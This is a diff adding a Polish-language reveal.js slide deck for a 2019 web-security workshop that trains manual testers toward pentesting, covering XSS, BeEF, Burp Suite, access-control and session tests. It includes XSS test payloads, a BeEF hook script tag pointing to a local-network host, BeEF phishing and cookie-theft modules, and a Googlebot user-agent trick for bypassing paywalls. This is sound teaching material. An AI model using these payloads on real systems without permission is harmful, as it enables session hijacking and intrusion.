@@ -1,0 +1,682 @@
+<!doctype html>
+<html lang="pl">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Tech 101: Od testera manualnego do pentestera</title>
+
+		<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
+		<meta name="author" content="Hakim El Hattab">
+
+		<meta name="apple-mobile-web-app-capable" content="yes">
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/white.css" id="theme">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+		
+		<style>
+			.reveal table th, .reveal table td {border-bottom: 0px;}
+			html.dimbg .slide-background {
+				opacity: 0.2 !important;
+			}
+			
+			#no-header {
+				visibility: hidden;
+				display: none;
+			}
+		</style>
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+		
+		
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+				
+					<section data-background="pictures/tlo_1.jpg" data-state="dimbg">
+						<h2>Tech 101: Od testera manualnego do pentestera</h2>
+						<p>
+							<h3>Women in Technology Warszawa - 17.09.2019</h3>
+						</p>
+						<p style="text-align:right"><a href="http://www.linkedin.com/in/klara-trzcinska">Klara Trzcińska</a></p>
+					</section>
+				
+				<section>	
+					<section>
+						<h2>Informacje organizacyjne</h2>
+					</section>
+					
+					<section>
+						<h3>O mnie</h3>
+						<p>Zajmuje się testami bezpieczeństwa aplikacji webowych oraz testami wydajnościowymi. Mam ponad trzy lata doświadczenia w pentestach. Moim głownym zainteresowaniem są testy bezpieczeństwa aplikacji webowych. Na codzień pracuję jako Starszy Specjalista w Pentacomp Systemy Informatyczne, gdzie zajmuje się głównie testami bezpieczeństwa aplikacji webowych oraz testami automatycznymi.</p>
+					</section>
+					
+					<section>
+						<h3>O Pentacomp</h3>
+						<p>Jesteśmy niezależnym producentem rozwiązań informatycznych i dostawcą profesjonalnych usług IT dla klientów z wybranych branż gospodarki i sektora publicznego. Dysponujemy wieloletnim doświadczeniem w realizacji strategicznych projektów dla największych w Polsce organizacji.</p>				
+						<img height="200" data-src="pictures/PC_Logo_www.jpg" alt="Pentacomp">
+					</section>
+					
+					<section>
+                        <h3>Code of Ethics</h3>
+                        <p>Prezentowanych na spotkaniu technik nie stosujemy na systemach bez zgody właściciela.</p>
+                    </section>
+					
+					<section>
+                        <h3>Korzystanie z prezentacji</h3>
+                        <ul>
+                            <li>Kliknięcie ESC wyświetla widok aktualnego slajdu i pozostałych slajdów.</li>
+							<li>Wybranie ikony w lewym dolnym rogu lub wciśnięcie klawisza <i>m</i> powoduje pojawienie się menu nawigacyjnego.</li>   
+                        </ul>
+                    </section>
+					
+					<section>
+					<h3>Agenda (I)</h3>
+						<ul>
+							<li>Wprowadzenie i statystyki dotyczące podatności</li>
+							<li>Organizacja OWASP – materiały i narzędzia OWASP</li>
+							<li>OWASP Top 10</li>
+							<li>Podstawowe informacje dotyczące aplikacji webowych</li>
+							<li>Skanowanie portów</li>
+						</ul>
+					</section>
+					
+					<section>
+					<h3>Agenda (II)</h3>
+						<ul>
+							<li>Przegląd baz danych podatności</li>
+							<li>Narzędzia typu lokalnego Proxy</li>
+							<li>Podatność XSS i jej wykorzystanie (BeEF i własny skrypt)</li>
+							<li><b>Przerwa obiadowa ok. 13:00</b></li>
+							<li>Ataki CSRF, przygotowanie przykładowej strony HTML wykonującej atak</li>
+						</ul>
+					</section>
+					
+					<section>
+					<h3>Agenda (III)</h3>
+						<ul>
+							<li>SQL Injection</li>
+							<li>Podatności kategorii Broken Access Control</li>
+							<li>Podsłuchanie komunikacji nieszyfrowanej z wykorzystaniem Wireshark</li>
+							<li>Ataki Slow HTTP</li>
+							<li>Skanery umożliwiające automatyczne testy bezpieczeństwa</li>
+							<li><b>Nagłowki bezpieczeństwa</b></li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Wprowadzenie</h2>
+					</section>
+					
+					<section>
+						<h3>Jakie są najczęściej występujące podatności aplikacji webowych? O jakich podatnościach ostatnio słyszeliście?</h3>
+						<small>
+						<a href="https://www.commonplaces.com/blog/6-common-website-security-vulnerabilities/">Most Common Website Security Vulnerabilities</a>
+						</small>
+					</section>				
+					
+					<section>
+						<h3>Statystyki 2014 - 2018 - raport Imperva</h3>
+						<img height="360" data-src="pictures/statistics2018.png" alt="Statystyki Imperva">
+						<p>Statystyki podatności w latach 2014 - 2018 według <a href="https://www.imperva.com/blog/the-state-of-web-application-vulnerabilities-in-2018/">raportu</a> Imperva</p>
+					</section>
+					
+					<section>
+                        <h3>Motywacja (I)</h3>
+                        <ul>
+                            <li>Wykonanie podstawowych testów bezpieczeństwa nie jest trudne.</li>
+							<li>Umiejętność wykrywania podstawowych podatności pomoże wykryć je na wczesnym etapie projektu.</li>
+							<li>Im wcześniej błąd zostanie wykryty tym łatwiej i taniej jest go naprawić.</li>
+						</ul>
+                    </section>
+					
+					<section>
+                        <h3>Motywacja (II)</h3>
+                        <ul>
+                            <li>Testy bezpieczeństwa wymagają znajmości metod HTTP m. in. GET/POST oraz świadomości możliwości obejścia walidacji po stronie serwera.</li>
+                        </ul>
+                    </section>
+					
+					<section>
+                        <h3>Test penetracyjny</h3>
+                        <ul>
+                            <li>Kontrolowany atak na system teleinformatyczny.</li>
+							<li>Umożliwia praktyczną ocenę stanu bezpieczeństwa.</li>
+							<li>Pentester wciela się w rolę potencjalnego włamywacza.</li>
+                        </ul>
+                    </section>
+					
+					<section>
+					<h3>Test penetracyjny - audyt - test bezpieczeństwa</h3>
+						<ul>
+                            <li>Pentest nie jest audytem. Audyt sprawdza zgodność z formalną specyfikacją stanu pożądanego (normą, aktem prawnym).</li>
+							<li>Test bezpieczeństwa jest pojęciem bardzo szerokim.</li>
+							<li>Testy bezpieczeństwa są często elementem testów pozafunkcjonalnych</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Ile milionów haseł uzytkowników Facebooka było dostępnych bez szyfrowania?</h3>
+						<small>
+						<a href="https://niebezpiecznik.pl/post/600-milionow-hasel-facebook-wyciek/">Hasła *** milionów użytkowników Facebooka były dostępne bez szyfrowania. Przez przypadek…</a>
+						</small>
+					</section>
+					
+				</section>
+				
+				<section>
+					<section>
+						<h2>Aplikacja webowa - podstawowe informacje</h2>
+					</section>
+					
+					<section>
+						<h3>Model Klient - Serwer</h3>
+						<ul>
+							<li>Klient wysyła żądanie (<i>request</i>) do serwera.</li>
+							<li>Żądanie zawiera URL (Uniform Resource Locator).</li>
+							<li>Serwer zwraca zasób, jeżeli jest dostępny (<i>response</i>).</li>
+							<li>HTTP jest protokołem bezstanowym.</li>
+							<li>Istnieją mechanizmy zapewniające emulację stanów - sesje, ciasteczka.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>URL</h3>
+						<img height="200" data-src="pictures/url.PNG" alt="URL">
+						<ul>
+							<li>host - adres serwera, w postaci domenowej lub adresu IP,</li>
+							<li>port - numer portu, na którym serwer odbiera połączenia TCP (80, 443, 8080),</li>
+							<li>path - ścieżka dostępu do zasobu, jeżeli nieobecna podaje się "/".</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Żądanie</h3>
+						<ul>
+							<li>Wybór metody,</li>
+							<li>Adres zasobu,</li>
+							<li>Wersja protokołu HTTP,</li>
+							<li>Dane.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Metoda GET</h3>
+						<p>Polega na umieszczeniu par parametr=wartość w adresie strony, np. <i>index.php?lang=pl&cat=2&sidebar=yes</i></p>
+					</section>
+					
+					<section>
+						<h3>Metoda POST</h3>
+						<p>Metoda POST powinna być stosowana tam, gdzie dane odwołanie jest formą interakcji z użytkownikiem, niemożliwą do utrwalenia w formie adresu. Powinna być także stosowana tam, gdzie dana operacja może wywołać wiążące dla użytkownika skutki – np. zapisanie na listę dyskusyjną.</p>
+					</section>
+					
+					<section>
+						<h3>Odpowiedź</h3>
+						<ul>
+							<li>Wersja protokołu HTTP,</li>
+							<li>Status odpowiedzi - trzycyfrowy kod np. 200 OK, 301 Moved Permanently, 404 Not found,</li>
+							<li>Dane.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Jakie zagrożenia wynikaja z przekazywania loginów/haseł/danych osobowych w URL?</h3>
+					</section>
+				</section>
+				
+								<section>
+					<section>
+						<h2>Zakres podstawowych testów bezpieczeństwa dla każdego testera</h2>
+					</section>
+					
+					<section>
+						<h3>Testy walidacji po stronie serwera poprzez próbę ominięcia walidacji zapewnianej przez GUI</h3>
+					</section>
+					
+					<section>
+						<h3>Testy dostępu do danych i plików bez zalogowania lub przez użytkowników z innym zakresem uprawnień</h3>
+					</section>
+					
+					<section>
+						<h3>Testy poprawnego zarządzania sesją użytkownika</h3>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Cross-Site Scripting - XSS</h2>
+					</section>
+				
+					<section>
+						<h3>Cross-Site Scripting - XSS (I)</h3>
+						<ul>
+							<li>Atak polegający na osadzeniu w treści atakowanej strony kodu, zazwyczaj JavaScript, który wyświetlany jest użytkownikowi.</li>
+							<li>Atakujący może wykonać skrypt po stronie użytkownika aplikacji internetowej porywając między innymi jego sesje lub powodując przekierowanie na inną stronę.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Cross-Site Scripting - XSS (II)</h3>
+						<ul>
+							<li>Reflected XSS (Nonpersistent XSS)</li>
+							<li>Persistent XSS (Stored XSS)</li>
+							<li>Oparte o DOM (DOM XSS)</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Stored XSS</h3>
+						<img height="338" data-src="pictures/Obraz1.png" alt="Regular expression">
+					</section>
+					
+					<section>
+						<h3>Reflected XSS</h3>
+						<img height="338" data-src="pictures/Obraz2.png" alt="Regular expression">
+					</section>
+					
+					<section>
+						<h3>XSS Lokator</h3>
+						Testy można wykonać manualnie, przesyłając w każdym możliwym parametrze, którego wartość jest zwracana użytkownikowi tzw. lokator XSS w postaci znaków:
+						<pre><code class="hljs" data-trim contenteditable>
+						'';!--"&lt;XSS&gt;=&{()}
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>XSS Standardowy Payload</h3>
+						Testy można wykonać z wykorzystaniem standardowego payloadu powodującego wyświetlenie okna z alertem:
+						<pre><code class="hljs" data-trim contenteditable>
+						&lt;script&gt;alert(1)&lt;/script&gt;
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Przykład wykonania XSS</h3>
+						<img height="538" data-src="pictures/xss_bs.png" alt="XSS example">
+					</section>
+				</section>
+				
+				<section>				
+					<section>
+						<h2>Wykorzystanie podatności Cross-Site Scripting (XSS)</h2>
+					</section>
+				
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (I)</h3>
+						Pakiet pozwala na wykorzystanie podatności XSS np. wyświetlenie okna dialogowego, uruchomienie dźwięku, pobranie plików cookie, czy zawartości schowka. 
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (II)</h3>
+						<pre><code class="hljs" data-trim contenteditable>
+							&lt;script src="http://192.168.1.14:3000/hook.js">&lt;/script&gt;
+						</code></pre>
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (III)</h3>
+						Panel logowania:
+						<a href="http://192.168.1.14:3000/ui/authentication">http://192.168.1.14:3000/ui/authentication</a>
+						Użytkownik testowy beef/beef<br>
+						Uwaga!
+						Możliwa jest tylko jedna aktywna sesja użytkownika beef. Logujcie się dopiero po zakończeniu prezentacji narzędzia.
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (IV)</h3>
+						<img height="498" data-src="pictures/beef.png" alt="Beef">
+					</section>
+					
+					<section>
+						<h3>Browser Exploitation Framework - BeEF (V)</h3>
+						<ul>
+								<li>Social Engineering</li>
+								<ul>
+									<li>Fake Notification</li>
+									<li>Google Phishing</li>
+									<li>Pretty Theft</li>
+								</ul>
+								<li>Browser</li>
+								<ul>
+									<li>Webcam HTML5</li>
+									<li>Hooked Domain</li>
+									<ul>
+										<li>Get page HTML</li>
+										<li>Get cookie</li>
+									</ul>
+								</ul>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Lokalne Proxy</h2>
+					</section>
+					<section>
+						<h3>Narzędzia typu lokalnego Proxy</h3>
+							<ul>
+								<li>Proxy jest zainstalowane na komputerze testującego.</li>
+								<li>Przeglądarka łączy się z Proxy, a następnie Proxy łączy się z żądaną stroną internetową.</li>
+								<li>Dzięki takiemu połączeniu możliwe jest przechwytywanie oraz zmiana danych wysyłanych pomiędzy przeglądarką, a serwerem.</li>
+							</ul>
+							<img height="158" data-src="pictures/Obraz5.png" alt="Proxy Lokalne">
+					</section>
+					<section>
+						<h3>Burp Suite (I)</h3>
+						<img height="258" data-src="pictures/burp.jpg" alt="Burp Suite">
+						<p>Bardzo popularne narzędzie wykorzystywane podczas testów bezpieczeństwa.</p>
+					</section>
+					<section>
+						<h3>Burp Suite (II)</h3>
+							<ul>
+								<li>Szczegółowa analiza i obróbka zapytań oraz odpowiedzi.</li>
+								<li>Możliwość powtórzenia i modyfikowania przesłanych wcześniej żądań.</li>
+								<li>Łatwe przenoszenie zapytań pomiędzy różnymi narzędziami.</li>
+								<li>Skaner automatyczny (pasywny i aktywny).</li>
+							</ul>
+					</section>
+					<section>
+						<h3>Instalacja certyfikatu Burp</h3>
+						<img height="400" data-src="pictures/BurpCA.png" alt="Burp Suite">
+						<p>Podczas importu certyfikatu należy zaznaczyć opcję <i>Trust this CA to identify web sites</i></p>
+					</section>
+					
+					<section>
+						<h3>Burp Suite Professional</h3>
+							<ul>
+								<li>Różnice między wersją Community i Professional.</li>
+								<li>Wersja Professional jest rozbudowana o skaner automatyczny i dodatki.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Przykład zastosowania - podmiana nagłówka User Agent</h3>
+							<ul>
+								<li>Podmiana nagłówka User Agent na Googlebot/2.1, czyli podszywanie się pod robota Google indeksującego sieć daje możliwość ominięcia ochrony w niektórych serwisach z płatną treścią, weryfikujących dostęp do treści na podstawie nagłowka żądania.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Googlebot</h3>
+						<img height="400" data-src="pictures/google_bot.png" alt="Googlebot">
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Testy walidacji po stronie serwera poprzez próbę ominięcia walidacji zapewnianej przez GUI</h2>
+					</section>
+					
+					<section>
+						<h3>Modyfikacja pól formularza typu readonly lub hidden (I)</h3>
+						Niektóre pola formularzy oznaczone są atrybutami:
+							<ul>
+								<li>readonly – pola tylko do odczytu, modyfikacja w przeglądarce jest wyłączona,</li>
+								<li>hidden – pola ukryte, nie są wyświetlane przez przeglądarkę.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Modyfikacja pól formularza typu readonly lub hidden (II)</h3>
+						Należy sprawdzić, czy modyfikacja wartości takiego pola jest możliwa przez:
+							<ul>
+								<li>modyfikację strony HTML w przeglądarce,</li>
+								<li>modyfikację przesyłanego żądania z wykorzystaniem narzędzia typu proxy.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Modyfikacja pola typu readonly</h3>
+						Parametr można usunąć bezpośrednio w przeglądarce modyfikując treść strony HTML. Przykład ze strony
+						<a href="https://www.w3schools.com/tags/tryit.asp?filename=tryhtml_input_readonly"> w3schools.com</a>. 
+
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Testy dostępu do danych i plików bez zalogowania lub przez użytkowników z innym zakresem uprawnień</h2>
+					</section>
+					
+					<section>
+						<h3>Modyfikacja identyfikatora załącznika (I)</h3>
+							<ul>
+								<li>Przykład pochodzi z aplikacji w której każdy z użytkowników do składanego wniosku załączał plik.</li> 
+								<li>Wgrywanym plikom przydzielany był identyfikator o kolejnej wartości.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Modyfikacja identyfikatora załącznika (II)</h3>
+							<ul>
+								<li>Pobranie załączonego pliku odbywało się za pomocą żądania z parametrem w którym podawany był identyfikator zasobu np. <i>GET //servlet.gupld?show=292258 HTTP/1.1</i></li>
+								<li>Zmiana parametru powodowała możliwość pobrania załącznika innego użytkownika.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Test dostępu do danych i plików bez zalogowania (I)</h3>
+							<ul>
+								<li>Przechwycenie żądania w narzędziu Burp Proxy.</li>
+								<li>Przesłanie żądania do zakładki Repeater.</li>
+								<li>Usunięcie plików cookie.</li>
+								<li>Porównanie odpowiedzi zwróconej po przesłaniu zmodyfikowanego żądania.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Test dostępu do danych i plików bez zalogowania (II)</h3>
+						<img height="300" data-src="pictures/cookie.png" alt="Bez cookie">
+					</section>
+					
+					<section>
+						<h3>Test dostępu do danych i plików przez użytkowników z innymi uprawnieniami (I)</h3>
+							<ul>
+								<li>Zalogowanie na dwóch użytkowników o różnym zakresie uprawnień np. zwykły użytkownik i administrator.</li>
+								<li>Wyświetlenie funkcji administracyjnych.</li>
+								<li>Przechwycenie żądania w narzędziu Burp Proxy.</li>
+								<li>Przesłanie żądania do zakładki Repeater.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Test dostępu do danych i plików przez użytkowników z innymi uprawnieniami (II)</h3>
+							<ul>
+								<li>Usunięcie plików cookie administratora i wstawienie plików cookie zwykłego użytkownika.</li>
+								<li>Porównanie odpowiedzi zwróconej po przesłaniu zmodyfikowanego żądania.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Dodatek Firefox Cookie Quick Manager</h3>
+						<img height="450" data-src="pictures/cookie_manager.png" alt="Cookie Quick Manager">
+					</section>					
+				</section>
+				
+				<section>
+					<section>
+						<h2>Testy poprawnego zarządzania sesją użytkownika</h2>
+					</section>
+					
+					<section>
+						<h3>Zarządzanie sesją użytkownika</h3>
+							<ul>
+								<li>Po zalogowaniu użytkownikowi przydzielany jest identyfikator na podstawie którego serwer identyfikuje użytkownika przy kolejnych żądaniach.</li> 
+								<li>Błędne zarządzanie sesją lub tworzenie błędnych identyfikatorów może skutkować przejęciem sesji.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Podstawowe testy poprawnego zarządzania sesją użytkownika</h3>
+							<ul>
+								<li>Test unieważniania sesji po wylogowaniu.</li>
+								<li>Test wygasania sesji po upłynięciu czasu trwania sesji.</li>
+								<li>Sprawdzenie czy identyfikator sesji nie jest przekazywany w adresie URL.</li>
+								<li>Sprawdzenie czy identyfikator sesji jest zmieniany po zalogowaniu.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Identyfikator sesji przekazywany w adresie URL (I)</h3>
+							<ul>
+								<li>Przekazywanie identyfikatora sesji w URL stanowi poważne zagrożenie m. in. ze względu na zapisanie identyfikatora sesji w historii przeglądarki, historii serwera proxy lub też możliwość przesłania z linkiem innemu użytkownikowi.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Identyfikator sesji przekazywany w adresie URL (II)</h3>
+							<ul>
+								<li>W niektórych przepadkach linki do zasobów css oraz js uzupełniane są o identyfikator sesji użytkownika, co pozwala na ominięcie ochrony zapewnianej przez dodanie do identyfikatora sesji flagi HttpOnly.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Identyfikator sesji przekazywany w adresie URL (III)</h3>
+						<img height="350" data-src="pictures/cookie_url.png" alt="Cookie w adresie URL">
+					</section>
+					
+					<section>
+						<h3>Regeneracja identyfikatora sesji</h3>
+							<ul>
+								<li>Przydzielanie nowego identyfikatora sesji po zalogowaniu do aplikacji chroni przed atakami typu Session Fixation.</li>
+								<li>Atak typu Session Fixation polega na nakłonieniu użytkownika do korzystania z identyfikatora sesji nadanego przez atakującego.</li>
+							</ul>
+					</section>
+					
+					<section>
+						<h3>Session Fixation</h3>
+						<img height="450" data-src="pictures/session_fixation.png" alt="Session Fixation">
+					</section>					
+				</section>
+				
+				<section>
+					<section>
+						<h2>Podsumowanie</h2>
+					</section>
+					
+					<section>
+						<h3>Testy do wykonania przez testera manulanego (I)</h3>
+						<ul>
+							<li>Testy ominięcia walidacji po stronie GUI.</li>
+							<li>Testy dostępu do danych i plików bez zalogowania lub przez użytkowników z innym zakresem uprawnień.</li>
+							<li>Test unieważniania sesji po wylogowaniu.</li>
+							<li>Test wygasania sesji po upłynięciu czasu trwania sesji.</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Testy do wykonania przez testera manulanego (II)</h3>
+						<ul>
+							<li>Sprawdzenie czy identyfikator sesji nie jest przekazywany w adresie URL.</li>
+							<li>Sprawdzenie czy identyfikator sesji jest zmieniany po zalogowaniu.</li>
+							<li>Testy podatności XSS.</li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Ćwiczenia dodatkowe</h2>
+					</section>
+				
+					<section>
+					<h3>Aplikacja testowa WebGoat</h3>
+						<ul>
+							<li>Testowa aplikacja instalowana lokalnie.</li>
+							<li>Posiada liczne podatności, które w ramach ćwiczeń należy znaleźć i wykorzystać.
+							<li><a href="https://github.com/WebGoat/WebGoat/releases">Link do pobrania WebGoat</a></li>
+						</ul>
+					</section>
+				</section>
+				
+				<section>
+					<section>
+						<h2>Skanery automatyczne</h2>
+					</section>
+					
+					<section>
+						<h3>Skanery automatyczne</h3>
+						<ul>
+							<li>Arachni</li>
+							<li>Nikto</li>
+							<li>Burp Suite</li>
+							<li>OWASP ZAP</li>
+							<li>OpenVas</li>
+							<li>Skipfish</li>
+						</ul>
+					</section>
+					
+					<section>
+						<h3>Arachni</h3>
+						<img height="478" data-src="pictures/Arachni.png" alt="Arachni">
+					</section>
+					
+					<section>
+						<h3>OpenVas</h3>
+						<img height="498" data-src="pictures/openvas.png" alt="OpenVas">
+					</section>
+				</section>
+				
+				<section style="text-align: left;" data-background="pictures/tlo_1.jpg" data-state="dimbg">
+					<h1>Dziękuję za uwagę</h1>
+				</section>
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.js"></script>
+
+		<script>
+
+			// More info https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// More info https://github.com/hakimel/reveal.js#dependencies
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/search/search.js', async: true },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/menu/menu.js'},
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
